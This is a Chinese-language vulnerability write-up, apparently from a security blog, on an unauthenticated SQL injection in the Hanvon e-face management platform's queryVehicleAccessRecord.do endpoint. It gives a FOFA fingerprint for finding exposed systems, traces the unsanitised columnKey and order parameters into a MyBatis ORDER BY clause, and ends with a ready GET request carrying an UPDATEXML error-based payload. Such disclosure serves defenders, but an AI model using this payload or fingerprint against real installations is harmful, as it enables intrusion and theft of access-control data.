---
title: "汉王e脸通综合管理平台 queryVehicleAccessRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryVehicleAccessRecord-sqli.html
asset_dir: embedded-base64
---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryVehicleAccessRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致[数据](#)库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

医疗器械与设备

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `VehicleAccessRecordController` 里关于 `queryVehicleAccessRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryVehicleAccessRecord.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson queryVehicleAccessRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "enterStartTime") String enterStartTime, @RequestParam(required = false,value = "enterEndTime") String enterEndTime, @RequestParam(required = false,value = "exitStartTime") String exitStartTime, @RequestParam(required = false,value = "exitEndTime") String exitEndTime, @RequestParam(required = false,value = "plateNum") String plateNum, @RequestParam(required = false,value = "carType") String carType, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            VehicleAccessRecordParam vehicleAccessRecordParam = new VehicleAccessRecordParam();
            vehicleAccessRecordParam.setPlateNum(plateNum);
            if (carType != null) {
                vehicleAccessRecordParam.setCarType(carType);
            }

            vehicleAccessRecordParam.setColumnKey(columnKey);
            vehicleAccessRecordParam.setOrder(order);
            vehicleAccessRecordParam.setEnterStartTime(enterStartTime);
            vehicleAccessRecordParam.setEnterEndTime(enterEndTime);
            vehicleAccessRecordParam.setExitStartTime(exitStartTime);
            vehicleAccessRecordParam.setExitEndTime(exitEndTime);
            PageHelper.startPage(page, pageSize);
            List<VehicleAccessRecord> list = this.vehicleAccessRecordAsm.queryVehicleAccessRecord(vehicleAccessRecordParam);
            PageInfo<VehicleAccessRecord> info = new PageInfo(list);
```

跟进`queryVehicleAccessRecord`方法

```
List<VehicleAccessRecord> queryVehicleAccessRecord(VehicleAccessRecordParam var1);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 VehicleAccessRecordVesm.xml

脚本语言

```
<!--查询视图-->
  <select id="queryVehicleAccessRecord" parameterType="com.hanvon.iface.tpm.vehicle.param.VehicleAccessRecordParam" resultMap="BaseResultMap">
    SELECT VC.PLATENUM, VC.USERID, VC.NAME, VC.CARTYPE, VC.CARDTYPE, VC.ENTERPASSAGE, VC.EXITPASSAGE,
    VC.ENTERTIME, VC.EXITTIME
    FROM v_car_passrecord VC
    WHERE 1 = 1
    <if test="plateNum != null">
      AND VC.PLATENUM like CONCAT('%',#{plateNum,jdbcType=VARCHAR},'%')
    </if>
    <if test="carType != null">
      AND VC.CARTYPE = #{carType}
    </if>
    <if test="enterStartTime != null and enterEndTime != null">
      AND VC.ENTERTIME &gt; #{enterStartTime,jdbcType=VARCHAR} AND #{enterEndTime,jdbcType=VARCHAR} &gt; VC.ENTERTIME
    </if>
    <if test="exitStartTime != null and exitEndTime != null">
      AND VC.EXITTIME &gt; #{exitStartTime,jdbcType=VARCHAR} AND #{exitEndTime,jdbcType=VARCHAR} &gt; VC.EXITTIME
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      VC.ENTERTIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 本地复现没有 v\_car\_passrecord 这个表
>
> 网络安全

```
GET /manage/vehicleAccessRecord/queryVehicleAccessRecord.do?branchId=1&columnKey=AND+(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&sn=111111 HTTP/1.1
Host: hanvon.mrxn.net
```
